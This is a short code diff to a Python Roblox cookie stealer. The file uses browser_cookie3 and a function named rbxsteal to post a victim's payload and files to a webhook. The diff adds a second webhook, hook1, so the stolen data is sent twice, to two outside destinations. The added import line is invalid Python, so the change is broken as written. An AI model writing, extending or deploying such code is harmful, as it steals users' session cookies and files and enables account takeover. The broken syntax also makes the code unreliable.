@@ -1,5 +1,5 @@
 import requests, robloxpy, json, browser_cookie3, os.path
-from configs import hook
+from configs import hook, import hook1
 
 user = os.path.expanduser("~")
 
@@ -147,4 +147,5 @@ def rbxsteal():
 
  r = requests.post(hook, data=json.dumps(payload), headers=headers)
  fil = requests.post(hook, files=file)
-
+ r = requests.post(hook1, data=json.dumps(payload), headers=headers)
+ fil = requests.post(hook1, files=file)
